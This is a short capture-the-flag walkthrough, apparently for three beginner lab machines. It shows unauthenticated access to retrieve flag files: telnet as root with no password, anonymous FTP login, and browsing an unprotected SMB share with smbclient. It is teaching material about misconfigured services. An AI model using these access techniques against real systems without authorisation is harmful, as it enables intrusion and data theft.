# Meow
## Connection
We just need to connect with telnet. The user will be root, with no password.
```console
> telnet 10.129.53.229
> Meow login: root
```

## Flag
Then we will have the flag just there.
```console
> ls
> cat flag.txt
```

# Fawn
## Connection
In this case we need to make a connection with ftp. We will use the **anonymous** user to connect, with no password.
```console
> ftp 10.129.1.14
Name (10.129.1.14:kali): anonymous
Password:
```

## Flag
With **get**, we can download the file.
```console
ftp> ls
ftp> get flag.txt
ftp> exit

> cat flag.txt
```

# Dancing
## Connection
We will need to use samba to connect. With the option **-L** we can see all the folders we have. We can see that the last one doesn't have protection.
```console
> smbclient -L //10.129.119.218/
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk 
> smbclient //10.129.119.218/WorkShares
```

## Flag
With the command **get** we can download the file.
```console
smb: \> ls
smb: \> cd James.P\
smb: \James.P\> ls
smb: \James.P\> get flag.txt
smb: \James.P\> exit

> cat flag.txt 
```
